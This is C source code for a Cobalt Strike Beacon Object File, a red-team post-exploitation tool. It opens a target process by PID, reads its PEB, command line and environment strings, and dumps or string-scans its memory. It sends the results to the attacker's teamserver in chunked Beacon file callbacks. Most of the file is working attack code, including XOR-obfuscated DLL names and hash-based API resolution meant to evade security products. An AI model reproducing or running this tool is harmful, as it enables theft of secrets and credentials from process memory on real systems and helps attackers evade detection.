#include "StringReaper.h"

void xorc(unsigned __int64 length, unsigned char * buff, unsigned char maskkey) {
  int i;
  for (i = 0; i < length; ++i) {
    buff[i] ^= maskkey;
  }
}

void getExportTables(DL * dll){
  void *ExportDirectory;
  ExportDirectory =  NULL;
  ExportDirectory = ADD(char*, dll->dllBase, DREF32(dll->dllBase + 0x3C));
  ExportDirectory = ADD(char*, dll->dllBase, DREF32(ExportDirectory + 0x88));
  dll->Export.Directory = ExportDirectory;
  dll->Export.AddressTable = ADD(char*, dll->dllBase, DREF32(ExportDirectory + 0x1C));
  dll->Export.NameTable    = ADD(char*, dll->dllBase, DREF32(ExportDirectory + 0x20));
  dll->Export.OrdinalTable = ADD(char*, dll->dllBase, DREF32(ExportDirectory + 0x24));
}

char bofError = noError;

long WINAPI VectoredHandler(struct _EXCEPTION_POINTERS *ExceptionInfo) {
  //BeaconPrintf(CALLBACK_OUTPUT,"VectoredHandler");
  char tmpErr = Error;
  bofError    = tmpErr;
  PCONTEXT Context;
  Context = ExceptionInfo->ContextRecord;
  Context->Rip++;
  return EXCEPTION_CONTINUE_EXECUTION;
}

void getRemotePEB(PEB * peb, ntapis * nt, HANDLE hProc, formatp * stringFormatObject){
  DWORD retLen;
  SIZE_T dwBytesRead;
  PROCESS_BASIC_INFORMATION pbi;
  long status = 0xFF;
  long err = 0x00;
  status = nt->NtQueryInformationProcess(hProc, ProcessBasicInformation, &pbi, sizeof(pbi), &retLen);
  KERNEL32$Sleep(100);
  if(status != STATUS_SUCCESS){
    BeaconPrintf(CALLBACK_ERROR,"@QueryInfoProc");
    err = 0x01;
    goto exit;
  }
  BeaconFormatPrintf(stringFormatObject,"PEB Base Address: %p\n",pbi.PebBaseAddress);

  // Get the ProcessParameters struct address
  status = nt->NtReadVirtualMemory(hProc, (PVOID)pbi.PebBaseAddress, peb, sizeof(PEB), &dwBytesRead);
  KERNEL32$Sleep(100);
  BeaconFormatPrintf(stringFormatObject,"peb.ProcessParameters: %p\n",peb->ProcessParameters);
  if(status != STATUS_SUCCESS){
    BeaconPrintf(CALLBACK_ERROR,"@ReadVM 1");
    err = 0x01;
    goto exit;
  }
exit:
    return;
}

void parsePeb(PEB * peb, formatp * stringFormatObject){
  BeaconFormatPrintf(stringFormatObject,"[+] PEB Parser\n");
  BeaconFormatPrintf(stringFormatObject,"|_ PEB.BeingDebugged:            %d\n",peb->BeingDebugged);
  BeaconFormatPrintf(stringFormatObject,"|_ PEB.ImageBaseAddress:         %p\n",peb->ImageBaseAddress);
  BeaconFormatPrintf(stringFormatObject,"|_ PEB.PEB_LDR_DATA:             %p\n",peb->Ldr);
  BeaconFormatPrintf(stringFormatObject,"|_ PEB.ProcessParameters:        %p\n",peb->ProcessParameters);
  BeaconFormatPrintf(stringFormatObject,"|_ PEB.KernelCallbackTable:      %p\n",peb->KernelCallbackTable);
  BeaconFormatPrintf(stringFormatObject,"|_ PEB.ReadOnlySharedMemoryBase: %p\n",peb->ReadOnlySharedMemoryBase);
  BeaconFormatPrintf(stringFormatObject,"|_ PEB.NumberOfProcessors:       %d\n",peb->NumberOfProcessors);
  BeaconFormatPrintf(stringFormatObject,"|_ PEB.NumberOfHeaps:            %d\n",peb->NumberOfHeaps);
  BeaconFormatPrintf(stringFormatObject,"|_ PEB.MaximumNumberOfHeaps:     %d\n",peb->MaximumNumberOfHeaps);
  BeaconFormatPrintf(stringFormatObject,"|_ PEB.ProcessHeaps:             %p\n",peb->ProcessHeaps);
  BeaconFormatPrintf(stringFormatObject,"|_ PEB.LoaderLock:               %p\n",peb->LoaderLock);
  BeaconFormatPrintf(stringFormatObject,"|_ PEB.MaximumNumberOfHeaps:     %d\n",peb->MaximumNumberOfHeaps);
  BeaconFormatPrintf(stringFormatObject,"|_ PEB.OSMajorVersion:           %d\n",peb->OSMajorVersion);
  BeaconFormatPrintf(stringFormatObject,"|_ PEB.OSMinorVersion:           %d\n",peb->OSMinorVersion);
  BeaconFormatPrintf(stringFormatObject,"|_ PEB.OSBuildNumber:            %d\n",peb->OSBuildNumber);
}

void getRemoteProcessParams(RTL_USER_PROCESS_PARAMETERS * ProcessParams, PEB * peb, ntapis * nt, HANDLE hProc, formatp * stringFormatObject){
  SIZE_T dwBytesRead = 0;
  long status = 0xFF;
  status = nt->NtReadVirtualMemory(hProc, peb->ProcessParameters, ProcessParams, sizeof(RTL_USER_PROCESS_PARAMETERS), &dwBytesRead);
  return;
}

wchar_t* getRemoteUnicodeString(void * pRemoteUnicodeString, unsigned long size_RemoteUnicodeString, ntapis * nt, HANDLE hProc, formatp * stringFormatObject){  
  wchar_t * uBuffer = NULL;
  SIZE_T dwBytesRead = 0;
  long status = 0xFF;
  uBuffer = (wchar_t*)KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), 0, size_RemoteUnicodeString+2);
  status = nt->NtReadVirtualMemory(hProc, pRemoteUnicodeString, (void*)uBuffer, size_RemoteUnicodeString, &dwBytesRead);
  //BeaconFormatPrintf(stringFormatObject,"uBuffer: %ws\n",uBuffer);
  return uBuffer;
}

void printEnvStrings(RTL_USER_PROCESS_PARAMETERS * ProcessParams, ntapis * nt, HANDLE hProc, formatp * stringFormatObject){
    void* nextEnvString;
    SIZE_T dwBytesRead = 0;
    long status = 0xFF;
    unsigned long environmentSize = 0;
    void* unicodeStrSize = NULL;
    unsigned char * envBuffer = NULL;
    environmentSize   = ProcessParams->EnvironmentSize;
    envBuffer = (unsigned char *)KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), 0, environmentSize+2);
    status = nt->NtReadVirtualMemory(hProc, ProcessParams->Environment, (void*)envBuffer, environmentSize, &dwBytesRead);;
    nextEnvString = envBuffer;

    BeaconFormatPrintf(stringFormatObject,"[+] Process Environment Strings\n");
    void* environmentEndAddr = nextEnvString + environmentSize;
    while (nextEnvString < environmentEndAddr) {
        BeaconFormatPrintf(stringFormatObject, "%ws\n",nextEnvString);
        unicodeStrSize = getUnicodeStrLen(nextEnvString)+2;
        nextEnvString += (unsigned __int64)unicodeStrSize;
    }
}

void parseRemoteProcessParams(RTL_USER_PROCESS_PARAMETERS * ProcessParams, ntapis * nt, HANDLE hProc, formatp * stringFormatObject){
  wchar_t * ImagePathName = NULL;
  wchar_t * CommandLine   = NULL;
  wchar_t * WindowTitle   = NULL;
  wchar_t * DesktopInfo   = NULL;
  wchar_t * ShellInfo     = NULL;
  wchar_t * RuntimeData   = NULL;
  BeaconFormatPrintf(stringFormatObject,"[+] PEB.ProcessParams Parser\n");
  BeaconFormatPrintf(stringFormatObject,"|_ ProcessParams.Environment:               %p\n",ProcessParams->Environment);
  BeaconFormatPrintf(stringFormatObject,"|_ ProcessParams.EnvironmentSize:           %d\n",ProcessParams->EnvironmentSize);
  BeaconFormatPrintf(stringFormatObject,"|_ ProcessParams.ImagePathName.Buffer:      %p\n",ProcessParams->ImagePathName.Buffer);
  BeaconFormatPrintf(stringFormatObject,"|_ ProcessParams.ImagePathName.Length:      %d\n",ProcessParams->ImagePathName.Length);

  ImagePathName = getRemoteUnicodeString(ProcessParams->ImagePathName.Buffer, ProcessParams->ImagePathName.Length, nt, hProc, stringFormatObject);
  BeaconFormatPrintf(stringFormatObject,"|_ ProcessParams.ImagePathName: %ws\n",ImagePathName);
  KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, ImagePathName);
  
  BeaconFormatPrintf(stringFormatObject,"|_ ProcessParams.CommandLine.Buffer:      %p\n",ProcessParams->CommandLine.Buffer);
  BeaconFormatPrintf(stringFormatObject,"|_ ProcessParams.CommandLine.Length:      %d\n",ProcessParams->CommandLine.Length);
  CommandLine   = getRemoteUnicodeString(ProcessParams->CommandLine.Buffer, ProcessParams->CommandLine.Length, nt, hProc, stringFormatObject);
  BeaconFormatPrintf(stringFormatObject,"|_ ProcessParams.CommandLine:   %ws\n",CommandLine);
  KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, CommandLine);

  WindowTitle   = getRemoteUnicodeString(ProcessParams->WindowTitle.Buffer, ProcessParams->WindowTitle.Length, nt, hProc, stringFormatObject);
  BeaconFormatPrintf(stringFormatObject,"|_ ProcessParams.WindowTitle:   %ws\n",WindowTitle);
  KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, WindowTitle);

  DesktopInfo   = getRemoteUnicodeString(ProcessParams->DesktopInfo.Buffer, ProcessParams->DesktopInfo.Length, nt, hProc, stringFormatObject);
  BeaconFormatPrintf(stringFormatObject,"|_ ProcessParams.DesktopInfo:   %ws\n",DesktopInfo);
  KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, DesktopInfo);

  ShellInfo   = getRemoteUnicodeString(ProcessParams->ShellInfo.Buffer, ProcessParams->ShellInfo.Length, nt, hProc, stringFormatObject);
  BeaconFormatPrintf(stringFormatObject,"|_ ProcessParams.ShellInfo:     %ws\n",ShellInfo);
  KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, ShellInfo);

  RuntimeData   = getRemoteUnicodeString(ProcessParams->RuntimeData.Buffer, ProcessParams->RuntimeData.Length, nt, hProc, stringFormatObject);
  BeaconFormatPrintf(stringFormatObject,"|_ ProcessParams.RuntimeData:   %ws\n",RuntimeData);
  KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, RuntimeData);
}

wchar_t * getCLI(PEB * peb, ntapis * nt, HANDLE hProc, formatp * stringFormatObject){
  RTL_USER_PROCESS_PARAMETERS ProcessParams;
  SIZE_T dwBytesRead = 0;
  unsigned __int64 qwSize = 4096;
  wchar_t * clistring = NULL;
  long status = 0xFF;
  long err = 0x00;
  clistring = (wchar_t*)KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), 0, qwSize);
  if(clistring == NULL){
    BeaconPrintf(CALLBACK_ERROR,"@HeapAlloc");
    err = 0x01;
    goto exitbof3;
  }
  
  // Get the address of the command line string
  status = nt->NtReadVirtualMemory(hProc, peb->ProcessParameters, &ProcessParams, sizeof(RTL_USER_PROCESS_PARAMETERS), &dwBytesRead);
  dwBytesRead = 0;

  // Get the command line string
  status = nt->NtReadVirtualMemory(hProc, ProcessParams.CommandLine.Buffer, (PVOID)clistring, ProcessParams.CommandLine.Length, &dwBytesRead);
  KERNEL32$Sleep(100);
  if(status != STATUS_SUCCESS){
    BeaconPrintf(CALLBACK_ERROR,"@ReadVM 3");
    err = 0x01;
    goto exitbof3;
  }

exitbof3:
  KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, clistring);
  
  return clistring;
}

void parseStrings(formatp *stringFormatObject, char *memory_buffer, unsigned __int64 memory_size) {
    BeaconFormatPrintf(stringFormatObject, "memory_buffer: 0x%p\nmemory_size: %llu\n", memory_buffer, memory_size);

    unsigned __int64 memcounter_original = 0;
    unsigned __int64 memcounter_strings = 0;
    unsigned __int64 strsize = 0;
    
    char *strings_buffer = intAlloc(memory_size); // Allocate buffer for output
    unsigned __int64 temp_start = 0; // Track the start of a potential string

    while (memcounter_original < memory_size) {
        unsigned char this_byte = memory_buffer[memcounter_original];
        unsigned char next_byte = (memcounter_original + 1 < memory_size) ? memory_buffer[memcounter_original + 1] : 0;

        // Detect ASCII characters
        if (this_byte >= 0x20 && this_byte <= 0x7E) {
            if (strsize == 0) temp_start = memcounter_strings; // Mark string start
            strings_buffer[memcounter_strings++] = this_byte;
            strsize++;
        } 
        // Detect UTF-16 Little Endian that can be converted to ASCII
        else if (this_byte == 0x00 && next_byte >= 0x20 && next_byte <= 0x7E) {
            if (strsize == 0) temp_start = memcounter_strings; // Mark string start
            strings_buffer[memcounter_strings++] = next_byte; // Store ASCII equivalent
            strsize++;
            memcounter_original++; // Skip the NULL byte in UTF-16
        } 
        // End of a valid string, add a newline separator
        else if (strsize > 0) {
            if (strsize >= 8) { // Only keep strings of 8 or more characters
                strings_buffer[memcounter_strings++] = '\n'; // Separate extracted strings
            } else {
                // Roll back if the string is too short
                memcounter_strings = temp_start;
            }
            strsize = 0;
        }

        memcounter_original++;
    }

    // Ensure the buffer ends with a newline
    if (memcounter_strings > 0 && strings_buffer[memcounter_strings - 1] != '\n') {
        strings_buffer[memcounter_strings++] = '\n';
    }

    BeaconFormatPrintf(stringFormatObject, "memcounter_strings: %llu\n", memcounter_strings);
    
    // Trim unused memory
    strings_buffer = intRealloc(strings_buffer, memcounter_strings);
    
    // Save extracted strings to file
    char *fileName = "memstrings.bin";
    downloadFile(fileName, 14, strings_buffer, memcounter_strings);

    // Free allocated memory
    intFree(strings_buffer);
}

void listMemorySections(ntapis * nt, HANDLE hProc, formatp * stringFormatObject, int memmode, int option, char * option2){
  long status = 0xFF;
  void * current_address = 0x0;
  void * base_address    = 0x0;
  SIZE_T region_size;
  MEMORY_INFORMATION_CLASS mic = 0;
  MEMORY_BASIC_INFORMATION mbi;
  SIZE_T dwBytesRead = 0;
  char * copied_memory_buffer = NULL;
  unsigned __int64 memory_index = 0x0;
  unsigned __int64 memory_size_counter = 0x0;
  int counter = 0x0;
  void * heapbuffer_write_index = NULL;
  //BeaconFormatPrintf(stringFormatObject, "memory_size_counter: %d\n",memory_size_counter); 
  while (TRUE) 
  {
    status = nt->NtQueryVirtualMemory(hProc, (PVOID)current_address, mic, &mbi, sizeof(mbi), NULL);
    if(status != STATUS_SUCCESS)
    {
       break; 
    }
    base_address = mbi.BaseAddress;
    region_size  = mbi.RegionSize;

    current_address = base_address + region_size;
    // Only display committed pages. Not freed and reserved memory pages
    if (mbi.State == MEM_COMMIT)
    //if (mbi.State == MEM_COMMIT && region_size > 0x600000)
    //if (mbi.State == MEM_COMMIT && region_size > 1000000)
    {
      char* type = NULL;
      if (mbi.Type == 0x1000000){
        type = "Image";
        if (option == 2){continue;}
        if (option == 4){continue;}
      }
      else if (mbi.Type == 0x40000){
        type = "Mapped";
        if (option == 2){continue;}
        if (option == 3){continue;}
      }
      else if (mbi.Type == 0x20000){
        type = "Private";
        if (option == 3){continue;}
        if (option == 4){continue;}
      }
      else {
        type = "UNKNOWN";
        if (option == 2){continue;}
        if (option == 3){continue;}
        if (option == 4){continue;}
      }

      if (xstrcmp("all",option2,3) != 0x00 ){
        if (xstrcmp("rwx",option2,3) == 0x00 ){ 
          if (mbi.Protect != 0x40){continue;}
        }
        else if (xstrcmp("rw",option2,2) == 0x00 ){ 
          if (mbi.Protect != 0x04){continue;}
        }
        else if (xstrcmp("r",option2,1) == 0x00 ){ 
          if (mbi.Protect != 0x02){continue;}
        }
      }
      char* protections = NULL;
      if (mbi.Protect == 0x10){
        protections = "PAGE_EXECUTE";
      }
      else if (mbi.Protect == 0x20){
        protections = "PAGE_EXECUTE_READ";
      }
      else if (mbi.Protect == 0x40){
        protections = "PAGE_EXECUTE_READWRITE";
      }
      else if (mbi.Protect == 0x80){
        protections = "PAGE_EXECUTE_WRITECOPY";
      }
      else if (mbi.Protect == 0x01){
        protections = "PAGE_NOACCESS";
      }
      else if (mbi.Protect == 0x02){
        protections = "PAGE_READONLY";
      }
      else if (mbi.Protect == 0x04){
        protections = "PAGE_READWRITE";
      }
      else if (mbi.Protect == 0x08){
        protections = "PAGE_WRITECOPY";
      }
      else if (mbi.Protect == 0x40000000){
        protections = "PAGE_TARGETS_INVALID";
      }
      else if (mbi.Protect == 0x40000000){
        protections = "PAGE_TARGETS_NO_UPDATE";
      }
      else {
        protections = "UNKNOWN";
      }
      // "Address: 0x%p / %-20d | DataSize: 0x%-12llx / %-16d | State: 0x%-10lx | Protect: 0x%-4lx | Type: %-8s / 0x%-8lx\n",
      BeaconFormatPrintf(
            stringFormatObject,
            "0x%p / %-16d | 0x%-10llx / %-8u | %-8s | %-26s / 0x%-8lx \n",
            base_address,
            base_address,
            region_size,
            region_size,
            type,
            protections,
            mbi.Protect);
      memory_index = memory_index + memory_size_counter; // this is the start of the new buffer after we reallocate to bigger memory buffer in heap
      //BeaconFormatPrintf(stringFormatObject, "memory_index: %d\n",memory_index); 
      memory_size_counter = memory_size_counter + (__int64)region_size; // this is the current total size of the memory we will copy to the heap buffer before we download it
     // BeaconFormatPrintf(stringFormatObject, "memory_size_counter: %d\n",memory_size_counter); 

      if (memmode == 0x02 || memmode == 0x03){
        //      copied_memory_buffer = (unsigned char *)KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), 0, region_size+2);
        //BeaconFormatPrintf(stringFormatObject, "counter: %d\n",counter); 
        if (counter == 0x00){
          copied_memory_buffer = (unsigned char *)intAlloc(memory_size_counter);
        //  BeaconFormatPrintf(stringFormatObject, "initial alloc for copied_memory_buffer address: %p\n",copied_memory_buffer); 
        }else{
          copied_memory_buffer = intRealloc(copied_memory_buffer,memory_size_counter);
         //BeaconFormatPrintf(stringFormatObject, "realloc for copied_memory_buffer address: %p\n",copied_memory_buffer); 
        }

        heapbuffer_write_index = (void*)ADD(char*,copied_memory_buffer, memory_index);
      //  BeaconFormatPrintf(stringFormatObject, "heapbuffer_write_index: %p\n",heapbuffer_write_index); 
        status = nt->NtReadVirtualMemory(hProc, base_address, copied_memory_buffer, region_size, &dwBytesRead);
        //BeaconFormatPrintf(stringFormatObject, "NtReadVirtualMemory status: %d\n",status);
        counter++;
      }
      //if (counter == 0x4){break;}
    }
  }
  if (memmode == 0x02 ){
    char * fileName = "memdump.bin";
    downloadFile(fileName, 11, copied_memory_buffer, memory_size_counter);
    KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, copied_memory_buffer);
    return;
  }
  if (memmode == 0x03 ){
    //BeaconFormatPrintf(stringFormatObject, "copied_memory_buffer: 0x%p\nmemory_size_counter: %d\n",copied_memory_buffer,memory_size_counter); 
    parseStrings(stringFormatObject, (char *) copied_memory_buffer, memory_size_counter);
    KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, copied_memory_buffer);
    return;
  }
  BeaconFormatPrintf(stringFormatObject, "Total selected memory size: 0x%X / %d\n",memory_size_counter,memory_size_counter); 
}

//credit @anthemtotheego and @binaryfaultline - from Hawkins' PR to CredBandit
void downloadFile(char* fileName, int downloadFileNameLength, char* returnData, int fileSize) {

	//Intializes random number generator to create fileId 
	time_t t;
	MSVCRT$srand((unsigned)MSVCRT$time(&t));
	int fileId = MSVCRT$rand();

	//8 bytes for fileId and fileSize
	int messageLength = downloadFileNameLength + 8;
	char* packedData = (char*)MSVCRT$malloc(messageLength);

	//pack on fileId as 4-byte int first
	packedData[0] = (fileId >> 24) & 0xFF;
	packedData[1] = (fileId >> 16) & 0xFF;
	packedData[2] = (fileId >> 8) & 0xFF;
	packedData[3] = fileId & 0xFF;

	//pack on fileSize as 4-byte int second
	packedData[4] = (fileSize >> 24) & 0xFF;
	packedData[5] = (fileSize >> 16) & 0xFF;
	packedData[6] = (fileSize >> 8) & 0xFF;
	packedData[7] = fileSize & 0xFF;

	int packedIndex = 8;

	//pack on the file name last
	for (int i = 0; i < downloadFileNameLength; i++) {
		packedData[packedIndex] = fileName[i];
		packedIndex++;
	}

	BeaconOutput(CALLBACK_FILE, packedData, messageLength);

	if (fileSize > (1024 * 900)) {

		//Lets see how many times this constant goes into our file size, then add one (because if it doesn't go in at all, we still have one chunk)
		int numOfChunks = (fileSize / (1024 * 900)) + 1;
		int index = 0;
		int chunkSize = 1024 * 900;

		while (index < fileSize) {
			if (fileSize - index > chunkSize) {//We have plenty of room, grab the chunk and move on

				/*First 4 are the fileId
			then account for length of file
			then a byte for the good-measure null byte to be included
				then lastly is the 4-byte int of the fileSize*/
				int chunkLength = 4 + chunkSize;
				char* packedChunk = (char*)MSVCRT$malloc(chunkLength);

				//pack on fileId as 4-byte int first
				packedChunk[0] = (fileId >> 24) & 0xFF;
				packedChunk[1] = (fileId >> 16) & 0xFF;
				packedChunk[2] = (fileId >> 8) & 0xFF;
				packedChunk[3] = fileId & 0xFF;

				int chunkIndex = 4;

				//pack on the file name last
				for (int i = index; i < index + chunkSize; i++) {
					packedChunk[chunkIndex] = returnData[i];
					chunkIndex++;
				}

				BeaconOutput(CALLBACK_FILE_WRITE, packedChunk, chunkLength);
				MSVCRT$free((void*)packedChunk);
			}
			else {//This chunk is smaller than the chunkSize, so we have to be careful with our measurements

				int lastChunkLength = fileSize - index + 4;
				char* lastChunk = (char*)MSVCRT$malloc(lastChunkLength);

				//pack on fileId as 4-byte int first
				lastChunk[0] = (fileId >> 24) & 0xFF;
				lastChunk[1] = (fileId >> 16) & 0xFF;
				lastChunk[2] = (fileId >> 8) & 0xFF;
				lastChunk[3] = fileId & 0xFF;
				int lastChunkIndex = 4;

				//pack on the file name last
				for (int i = index; i < fileSize; i++) {
					lastChunk[lastChunkIndex] = returnData[i];
					lastChunkIndex++;
				}
				BeaconOutput(CALLBACK_FILE_WRITE, lastChunk, lastChunkLength);
				MSVCRT$free((void*)lastChunk);
			}
			index = index + chunkSize;
		}
	}
	else {

		/*first 4 are the fileId
		then account for length of file
		then a byte for the good-measure null byte to be included
		then lastly is the 4-byte int of the fileSize*/
		int chunkLength = 4 + fileSize;
		char* packedChunk = (char*)MSVCRT$malloc(chunkLength);

		//pack on fileId as 4-byte int first
		packedChunk[0] = (fileId >> 24) & 0xFF;
		packedChunk[1] = (fileId >> 16) & 0xFF;
		packedChunk[2] = (fileId >> 8) & 0xFF;
		packedChunk[3] = fileId & 0xFF;
		int chunkIndex = 4;

		//pack on the file name last
		for (int i = 0; i < fileSize; i++) {
			packedChunk[chunkIndex] = returnData[i];
			chunkIndex++;
		}

		BeaconOutput(CALLBACK_FILE_WRITE, packedChunk, chunkLength);
		MSVCRT$free((void*)packedChunk);
	}


	//We need to tell the teamserver that we are done writing to this fileId
	char packedClose[4];

	//pack on fileId as 4-byte int first
	packedClose[0] = (fileId >> 24) & 0xFF;
	packedClose[1] = (fileId >> 16) & 0xFF;
	packedClose[2] = (fileId >> 8) & 0xFF;
	packedClose[3] = fileId & 0xFF;
	BeaconOutput(CALLBACK_FILE_CLOSE, packedClose, 4);

	return;
}

void go(char * args, int len) {
  formatp stringFormatObject;  // Cobalt Strike beacon format object we will pass strings too
  BeaconFormatAlloc(&stringFormatObject, 312 * 1024); // allocate memory for our string blob
  datap parser;
  SIZE_T pid;
  char * mode = NULL;
  char * option = NULL;
  char * option2 = NULL;
  BeaconDataParse(&parser, args, len);
  pid     = BeaconDataInt(&parser);
  mode    = BeaconDataExtract(&parser, NULL);
  option  = BeaconDataExtract(&parser, NULL);
  option2 = BeaconDataExtract(&parser, NULL);
  HANDLE hProc = NULL;
  OBJECT_ATTRIBUTES oa={sizeof(oa),0,NULL,0};
  CLIENT_ID cid = {0};
  cid.pid = NULL;
  cid.UniqueThread = NULL;
  cid.pid = (HANDLE)pid;
  wchar_t* clistring = NULL;
  PEB peb = {0};
  RTL_USER_PROCESS_PARAMETERS ProcessParams = {0};
  DL ntdll = {0};
  long status = 0xFF;
  long err = 0x00;
  ntapis nt = {0};
  nt.NtOpenProcess = NULL;
  nt.NtReadVirtualMemory = NULL; 
  nt.NtQueryInformationProcess = NULL; 
  nt.NtClose = NULL;
  nt.NtQueryVirtualMemory = NULL;

  PVOID h1 = KERNEL32$AddVectoredExceptionHandler(1,(PVECTORED_EXCEPTION_HANDLER)VectoredHandler);

  // Get Base Address of ntdll.dll
  ntdll.dllBase = NULL;
  unsigned char ws_nt[] = {0xd2,0xBC,0xc8,0xBC,0xd8,0xBC,0xd0,0xBC,0xd0,0xBC,0x92,0xBC,0xd8,0xBC,0xd0,0xBC,0xd0,0xBC,0xBC}; // L"ntdll.dll" xor 0xBC
  xorc(19, ws_nt, XORKEY);
  ntdll.dllBase = (void*)getDllBase(ws_nt);
  if(ntdll.dllBase == NULL || bofError == Error){
    err = 0x01;
    goto exitbof1;
  }

  getExportTables(&ntdll);

  nt.NtOpenProcess = (tNtOpenProcess) hash2Address(0x2002dd17d403f81e, ntdll.dllBase, ntdll.Export.AddressTable, ntdll.Export.NameTable, ntdll.Export.OrdinalTable);
  if(nt.NtOpenProcess == NULL){
    err = 0x01;
    goto exitbof1;
  }

  nt.NtReadVirtualMemory = (tNtReadVirtualMemory) hash2Address(0x0d11fbf62b0d1006, ntdll.dllBase, ntdll.Export.AddressTable, ntdll.Export.NameTable, ntdll.Export.OrdinalTable);
  if(nt.NtReadVirtualMemory == NULL){
    err = 0x01;
    goto exitbof1;
  }

  nt.NtQueryInformationProcess = (tNtQueryInformationProcess) hash2Address(0x400911060235eafb, ntdll.dllBase, ntdll.Export.AddressTable, ntdll.Export.NameTable, ntdll.Export.OrdinalTable);
  if(nt.NtQueryInformationProcess == NULL){
    err = 0x01;
    goto exitbof1;
  }

  nt.NtClose = (tNtClose) hash2Address(0x2a07331c1f031500, ntdll.dllBase, ntdll.Export.AddressTable, ntdll.Export.NameTable, ntdll.Export.OrdinalTable);
  if(nt.NtClose == NULL){
    err = 0x01;
    goto exitbof1;
  }

  nt.NtQueryVirtualMemory = (tNtQueryVirtualMemory) hash2Address(0x1e26fb340527f306, ntdll.dllBase, ntdll.Export.AddressTable, ntdll.Export.NameTable, ntdll.Export.OrdinalTable);
  if(nt.NtQueryVirtualMemory == NULL){
    err = 0x01;
    goto exitbof1;
  }
  BeaconPrintf(CALLBACK_OUTPUT,"readProcess BOF (Bobby Cooke|@0xBoku|github.com/boku7|linkedin.com/in/bobby-cooke/)");
  // Open a handle to the target process
  status = nt.NtOpenProcess(&hProc, GENERIC_READ, &oa, &cid);
  if(status != STATUS_SUCCESS){
    BeaconFormatPrintf(&stringFormatObject, "Failed to open a handle to %d (PID)\n",cid.pid); 
    err = 0x01;
    goto exitbof1;
  }
  BeaconFormatPrintf(&stringFormatObject, "Opened a handle to %d (PID)\n",cid.pid); 

  BeaconFormatPrintf(&stringFormatObject, "Mode: %s\n",mode); 

  // PEB Mode
  if ( xstrcmp("peb",mode,3) == 0x00 ){
    BeaconFormatPrintf(&stringFormatObject, "Getting remote PEB \n"); 
    getRemotePEB(&peb, &nt, hProc, &stringFormatObject);
    parsePeb(&peb, &stringFormatObject);
    getRemoteProcessParams(&ProcessParams, &peb, &nt, hProc, &stringFormatObject);
    parseRemoteProcessParams(&ProcessParams, &nt, hProc, &stringFormatObject);
    goto exitbof1;
  }
  if ( xstrcmp("env",mode,3) == 0x00 ){
    BeaconFormatPrintf(&stringFormatObject, "Getting remote env strings \n"); 
    getRemotePEB(&peb, &nt, hProc, &stringFormatObject);
    getRemoteProcessParams(&ProcessParams, &peb, &nt, hProc, &stringFormatObject);
    printEnvStrings(&ProcessParams, &nt, hProc, &stringFormatObject);
    goto exitbof1;
  } 

  // List || Download Memory Sections Mode
  int memmode = 0x0;
  if (xstrcmp("list",mode,4) == 0x00 ){
    memmode = 0x1;
  }
  else if (xstrcmp("download",mode,8) == 0x00 ){
    memmode = 0x2;
  }
  else if (xstrcmp("strings",mode,6) == 0x00 ){
    memmode = 0x3;
  }

  //BeaconFormatPrintf(&stringFormatObject, "memmode: %d\n",memmode); 
  if (memmode != 0x00 ){
    if (xstrcmp("private",option,7) == 0x00 ){
      listMemorySections(&nt, hProc, &stringFormatObject,memmode,2,option2);
    }
    else if (xstrcmp("image",option,5) == 0x00 ){
      listMemorySections(&nt, hProc, &stringFormatObject,memmode,3,option2);
    }
    else if (xstrcmp("mapped",option,6) == 0x00 ){
      listMemorySections(&nt, hProc, &stringFormatObject,memmode,4,option2);
    }
    else{
      listMemorySections(&nt, hProc, &stringFormatObject,memmode,1,option2);
    }
  }

  if (memmode == 0x02 ){
    return;
  }
  if (memmode == 0x03 ){
    return;
  }
    
exitbof1:
  KERNEL32$RemoveVectoredExceptionHandler(h1);
  //BeaconPrintf(CALLBACK_OUTPUT,"error: %d", err);
  if (err != 0x00){
    BeaconPrintf(CALLBACK_ERROR,"Error in BOF, exiting..");
  }
  if (hProc != NULL){
    nt.NtClose(hProc);
  }
  int sizeOfObject   = 0;
  char* outputString = NULL;
  outputString = BeaconFormatToString(&stringFormatObject, &sizeOfObject);
  BeaconOutput(CALLBACK_OUTPUT, outputString, sizeOfObject);
  BeaconFormatFree(&stringFormatObject);
  return;
}